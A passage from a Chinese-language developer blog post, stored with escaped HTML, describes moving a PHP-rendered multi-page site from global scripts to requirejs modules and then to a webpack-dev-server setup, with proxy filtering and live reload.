obj;</span><br></pre></td></tr></table></figure>\n<p>至此我们再打包便可以轻轻松松合并了（当然如果你要提取公共代码的话又是另外一个插件了，这里不再赘述）</p>\n<p>打包发布的问题解决了，最重要的一环<strong>开发环境的搭建</strong>呢？</p>\n<p>其实机智的我早料到这种配置在我们的项目并不完美，因为<code>HtmlWebpackPlugin</code>这个插件需要的模板是放在硬盘里的静态文件模板，它会自动插入构建好的<code>js</code>和<code>css</code>文件，我们的模板不是静态的，是从php后端渲染的一段动态的html，还是作死试了试，果然出现了以下情况</p>\n<ul>\n<li>动态引用的<code>header、footer</code>不见了</li>\n<li>页面出现一堆后端模板的语法<code>{$xxx}{$yyy}{$zzz}</code></li>\n</ul>\n<p>其实<code>webpack-dev-server</code>提供了一个代理功能，那这里的问题解决起来就美滋滋了。单纯的我最先的配置是这样的：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>( <span class=\"string\">'express'</span> )</span><br><span class=\"line\"><span class=\"keyword\">var</span> proxyMiddleware = <span class=\"built_in\">require</span>( <span class=\"string\">'http-proxy-middleware'</span> )</span><br><span class=\"line\"><span class=\"keyword\">var</span> app = express();</span><br><span class=\"line\"><span class=\"comment\">// 这是代理的</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> proxyTable = &#123;</span><br><span class=\"line\">  <span class=\"string\">'/'</span>: &#123;</span><br><span class=\"line\">    target: <span class=\"string\">'http://xxxx.cn/'</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.keys( proxyTable ).forEach( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> context </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> options = proxyTable[ context ]</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> options === <span class=\"string\">'string'</span> ) &#123;</span><br><span class=\"line\">    options = &#123;</span><br><span class=\"line\">      target: options</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 应用代理地址和代理目标</span></span><br><span class=\"line\">  app.use( proxyMiddleware( options.filter || context, options ) )</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>以上代码将我们所有的请求路径一股脑全部代理给后端<code>php</code>服务了，<code>HtmlWebpackPlugin</code>这个插件会自动写入依赖的脚本文件和样式表文件，但是此时的文件是<code>webpack-dev-server</code>服务生成的，并且存在于内存里，所以此时我们再运行<code>webpack</code>开启的服务，就会造成页面出来了(包括任何动态从服务端渲染的数据)，但是样式和<code>js</code>都没有加载，因为请求被代理到了后端，后端的目录里并不存在这些文件（废话么），所以我们需要过滤掉这些特定的请求不让<code>http-proxy-middleware</code>插件进行代理，为了区分这些特定的请求，我们将<code>entry</code>字段里的文件名都加上一个前缀<code>__webpack</code>或任何独一无二的与后台请求开头不一样的字符串，此时<code>proxyTable</code>里的<code>filter</code>函数就派上用场了，查看官方文档是这么描述这个函数的</p>\n<blockquote>\n<p>For full control you can provide a custom function to determine which requests should be proxied or not.</p>\n</blockquote>\n<blockquote>\n<p>为了完全控制你的请求，你可以定义一个函数来确定这些请求是否应该被提交</p>\n</blockquote>\n<p>于是我终于拿出一个满意的代理配置文件，开心得我仿佛升职加薪了一样😁</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> proxyTable = &#123;</span><br><span class=\"line\">  <span class=\"string\">'/'</span>: &#123;</span><br><span class=\"line\">    target: <span class=\"string\">'http://xxx.cn/'</span>,</span><br><span class=\"line\">    changeOrigin: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    filter( pathname, req ) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> !<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>( <span class=\"string\">`^\\/(__webpack|<span class=\"subst\">$&#123;assetsSubDirectory&#125;</span>)`</span> ).test( pathname );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>让我来解释一下上面的代码：未匹配到以<code>__webpack</code>开头的请求，都进行代理，这里添加了一个<code>assetsSubDirectory</code>变量，这个变量其实是webpack生成的<strong>图片、字体文件、json文件、svg</strong>等仍然存在于内存里的引用的路径，因为在内存里随着我们的编码可能实时变动，所以它们还是不需要做代理，直接过滤掉。</p>\n<p>对了，遗漏了一个很重要的配置，代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins: [</span><br><span class=\"line\">  <span class=\"keyword\">new</span> HtmlWebpackPlugin( &#123;</span><br><span class=\"line\">    alwaysWriteToDisk: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// php端使用到的模板</span></span><br><span class=\"line\">    filename: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/Application/Home/View/Index/index.html`</span>,</span><br><span class=\"line\">    <span class=\"comment\">// 模板文件</span></span><br><span class=\"line\">    template: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/Application/Home/View-template/Index/index.html`</span>,</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'__webpack-indexController'</span> ],</span><br><span class=\"line\">    inject: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>机智的我们肯定能发现<code>View-template</code>这里的不同，见名知意，这个文件夹里的html都是对应的后端的模板视图文件，我们通过<code>alwaysWriteToDisk</code>这个参数（其实还需要配合另外一个插件）以<code>template</code>字段的值为目标，实时写入到<code>filename</code>对应的文件里，而此时，因为浏览器访问的页面里因为我们启动<code>webpack-dev-server</code>时已经编译了这个文件，js会主动和webpack服务建立一个<code>eventSource</code>长连接（这个连接也是排除在代理范围内的）来监听文件变化，所以就会自动刷新浏览器，从而实现我们的<code>live-reload</code>。</p>\n<p>至此，从<code>准现代期</code>到<code>现代期</code>的过渡方案就算是完成了，接下面便是寻找一个合适的时间点实施到项目中去。若你要问我那么多页面是不是全都一个个得配，当然是，但是为了方便易维护，能不侵入现有项目去修改文件名，我们肯定需要去手动编写一个<code>map</code>映射文件，来指明我们的模板文件对应的入口文件，通过这个map我们再来动态生成<code>entry</code>和<code>HtmlWebpackPlugin</code>需要的模板路径，当然这里并不是没有便捷的办法，我们可以写一个脚本去读取<code>View-template</code>下面的目录来自动生成map但是因为我们童鞋在命名的时候文件夹和对应的入口文件并不能对应上，就得修改，这并不是推荐的做法，而且也不方便我们在改造代码风格的时候进行单个调试。</p>\n<p>上面的示例代码都不是完整的，因为我并不是要提供一个<code>webpack</code>的教程，而是解决后端和前端html耦合的<code>webpack-dev-server</code>配置的问题。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>博主是14年入的程序员大军，当时主<code>java</code>兼具前端开发的活儿，在现在看来的一些流开发框架和新兴思想，早在<code>node.js</code>开始进入大家视野的时候就流行起来了，只是在那时博主并没有关注前端的生态圈（然而java好像也并没有关注，逃），所以还是处在很多人所描述的<code>刀耕火种</code>的阶段，前端代码全部挂载到全局作用域，包括插件导出的变量。那更别提<code>组件化</code>和<code>模块化</code>的编程思想了，甚至代码都不用压缩优化就直接上传到服务器发布了。</p>\n<p>后来换了一家公司，没有<strong>前端开发</strong>这个职位，是从javaer转过去的，因为项目需要，渐渐的也就坐实了这个岗位。项目到现在（2014年8月-2017年7月22日）一共出现了三个阶段</p>\n<blockquote>\n<ul>\n<li>用着十年前的开发（或者叫整合）技术的<strong>简陋期</strong></li>\n<li>经历4、5个月的半模块化改造的<strong>准现代期</strong></li>\n<li>到现在能整合全局资源（仅限web静态资源）,随意整合新技术的<strong>现代期</strong>（未实施）</li>\n</ul>\n</blockquote>\n<p>为什么要不断的去折腾，去改造？仅仅是为了跟上“现代”的步伐吗？下面我将讲述每个阶段是如何无痛改造的，为什么要改造。</p>\n<h3>从<code>简陋期</code>到<code>准现代期</code></h3>\n<p>举个例子，我们以前的代码是这样的</p>\n<h4>html页面部分</h4>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"style.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 通用的代码 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"common.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 第三方的插件代码 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"plugin.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 我们的主入口 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"individual.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4>javascript部分</h4>\n<p>在<code>common.js</code>里，是我们的定义的通用函数，比如一些特定组件的部分代码如<code>header</code>或<code>footer</code>，或者是字符串处理，日期格式化的函数等等，这些函数都以对象或函数的形式暴露在全局作用域里，<strong>非常的冗杂</strong>和不安全，随着代码量的增加，容易导致覆盖，出现难以预料的bug，还有一个致命的弱点就是无法按需加载资源，我哪怕只是用到了其中一个小小的常量，都需要引用整个文件，然后从全局作用域里拿。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// common.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> Header = &#123;</span><br><span class=\"line\">  var1: <span class=\"string\">''</span>,</span><br><span class=\"line\">  var2: &#123;&#125;,</span><br><span class=\"line\">  fn1: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// some code</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  fn2: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// some code</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">strReplace</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// some code</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// individual.js</span></span><br><span class=\"line\"><span class=\"comment\">// 也许我们早已有觉悟 使用了自执行匿名函数来防止全局变量的污染</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 这里我们需要用到commonjs的函数 常量等</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> afterHandleStr = strReplace(str);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 也许我们忘记strReplace函数已存在全局作用域又或者换了一个人</span></span><br><span class=\"line\">  <span class=\"comment\">// 来维护这个文件可能又会定义一个函数叫strReplace</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">strReplace</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 那么此时根据javascript特性，原先的函数已经被覆盖了，</span></span><br><span class=\"line\">    <span class=\"comment\">// 上面的调用逻辑优先从最近的作用域开始找，于是会执行到这里</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;());</span><br></pre></td></tr></table></figure>\n<p>因为项目是迭代开发的，功能一点点叠加上去，考虑到整个项目的生命周期，不至于到后期完全无法维护，所以我们必须以优雅的姿态去重构整个项目的资源引用方式，那就是<strong>模块化</strong>，一个模块做一件事情，并暴露它对外提供的接口以供具象化的页面来使用。比如<code>header</code>，<code>footer</code>，<code>nav</code>，<code>sidebar</code>，<code>utils</code>等等。前端的模块化有俩个标准，一个<code>AMD(Asynchronous Module Definition)</code>，一个是<code>CMD(Common Module Definition)</code>，前者是<strong>异步模块定义，推崇依赖前置</strong>，后者是<strong>通用模块定义，推崇依赖就近</strong>，AMD的代表框架有<code>requirejs</code>，CMD的代表框架有<code>seajs</code>，都是很优秀的作品，<a href=\"https://www.zhihu.com/question/20351507\" target=\"_blank\" rel=\"noopener\">这里对二者有详细的介绍</a>。最后我选择了<code>requirejs</code>作为本次重构的基础，其实就当是的代码来说，改造起来并没有什么难度，就是需要细心，细心，细心，只需要将<code>common.js</code>这个通用模块进行拆分就好了，页面只需要引入一个js文件，如下面这样</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"style.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">data-main</span>=<span class=\"string\">\"/individual.js\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/require.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>data-main</code>是我们的代码主入口，<code>src</code>是<code>requireJs</code>的源码。从文件引用来说，至少我们不必再关心每次使用一个插件都要手动来加入一个<code>script</code>标签了，如何引用呢？我下面会介绍。<br>\n假如我们以前的代码是这样的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// common.js</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> exportObj = &#123;</span><br><span class=\"line\">    aa: <span class=\"string\">'aa'</span>,</span><br><span class=\"line\">    bb: <span class=\"string\">'bb'</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> utils = &#123;</span><br><span class=\"line\">    replaceStr: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 放到全局作用域</span></span><br><span class=\"line\">  <span class=\"built_in\">window</span>.exportObj = exportObj;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.utils = utils;</span><br><span class=\"line\">&#125;());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// individual。js</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = constants.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = constants.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;());</span><br></pre></td></tr></table></figure>\n<p>上面的代码使用了两个全局对象，<code>constants</code>和<code>utils</code>，那么改造后应该是：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// constants.js</span></span><br><span class=\"line\"><span class=\"comment\">// 如果它不依赖于其他模块，就不必声明依赖的数组</span></span><br><span class=\"line\">define( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> exportObj = &#123;</span><br><span class=\"line\">    aa: <span class=\"string\">'aa'</span>,</span><br><span class=\"line\">    bb: <span class=\"string\">'bb'</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回我们要暴露出来的对象，不用再放到全局作用域</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> exportObj;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// utils.js</span></span><br><span class=\"line\">define( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回我们要暴露出来的对象，不用再放到全局作用域</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span>  &#123;</span><br><span class=\"line\">    replaceStr: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// individual</span></span><br><span class=\"line\">define( [</span><br><span class=\"line\">  <span class=\"string\">'constants'</span>,</span><br><span class=\"line\">  <span class=\"string\">'utils'</span></span><br><span class=\"line\">], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> consts, utils </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// 或者</span></span><br><span class=\"line\">define( [</span><br><span class=\"line\">  <span class=\"string\">'constants'</span>,</span><br><span class=\"line\">  <span class=\"string\">'utils'</span></span><br><span class=\"line\">], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> consts = <span class=\"built_in\">require</span>(<span class=\"string\">'constants'</span>);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> utils = <span class=\"built_in\">require</span>(<span class=\"string\">'utils'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>是不是感觉毫无挑战性，对，这就是一个体力活，细心点就好了</p>\n<blockquote>\n<p>我们不必担心还需要手动去改动第三方插件，现在的主流插件基本都会<code>UMD</code>方式去适配，也就是兼容了<code>AMD</code>，<code>CMD</code>，所以只需要直接引用第三方插件就行了，不必再去html文件里手动引用script标签了，其他具体实现细节和必备的配置可以参照<a href=\"http://requirejs.org/\" target=\"_blank\" rel=\"noopener\">requirejs官网</a>的例子</p>\n</blockquote>\n<p>等到改造完，也还没有愉快的结束，我们的<strong>准现代期</strong>增加了一个优化环节，官方提供了<code>r.js</code>这个优化器来帮我们打包压缩代码（毕竟生产环境过多的请求数还是不被允许的），此时的改造才真的做到了<strong>模块化</strong>，<strong>能优化</strong>，从<strong>简陋期</strong>无痛过渡到<strong>准现代期</strong>。此时的代码，其实已经具备了进入<strong>现代期</strong>的要求，那就是<strong>规范模块化</strong>。下面是我们即将进行的改造，顺利过渡到<strong>现代期</strong>，从而拥抱你想使用的新技术</p>\n<h3>从<code>准现代期</code>到<code>现代期</code></h3>\n<p>其实这个阶段，因为对一些新工具新技术的不熟悉，绕了很多弯子，花费了不少的精力，好在弄出来了，基于<code>webpack</code>构建工具，解放键盘<code>F5</code>，加入代码风格和规范的检查工具，加入<code>ECMAScript 6</code>语法转换工具等等，为什么要使用这些，概括为主要以下几点：</p>\n<ul>\n<li>提升开发效率和代码质量</li>\n<li>新语法新和技术能解决开发上的很多痛点和盲点</li>\n<li>强大的整合性和包容性（相对于封闭的<code>r.js</code>优化器终于可定制了）</li>\n<li>emmmmmm思考中</li>\n</ul>\n<p>首先我们介绍一下<code>webapck</code>是什么<br>\n<img src=\"webpack.png\" alt=\"webpack\"><br>\n这是<code>webpack</code>官方文档首页对其的简单描述（ps: 其实中间的正方体是会旋转的哦），强大的<code>webpack</code>能整合所有依赖的文件进行处理，如<code>less</code>编译（依赖<code>less-loader</code>），<code>ES6</code>语法转换（依赖<code>babel-loader</code>），文件<code>hash</code>添加，自动上传ftp发布生产环境等等。还有就是<code>webpack-dev-server</code>这个开发神器，<strong>热替换</strong>、<strong>自动监测文件变化刷新浏览器</strong>，虽然<code>现代期</code>并没有用到实际项目中去，但是到现在（2017年7月22日）,我已经能完全拿出一套方案，使现有项目平滑过度到<code>webpack</code>。（ps：网上的教程大多是基于单页单入口的SPA应用，和后端完全解耦的，我们的项目是和后端处于半解耦状态，并且是多页多入口，所以并不能使用大多数的webpack配置文件，需要进行变通处理）</p>\n<p>我们先来说说处理一般的<code>SPA</code>应用的配置参数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  entry: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// webpack生成的文件名和入口文件</span></span><br><span class=\"line\">    <span class=\"comment\">// 我们是多页入口，先以首页为例</span></span><br><span class=\"line\">    index: <span 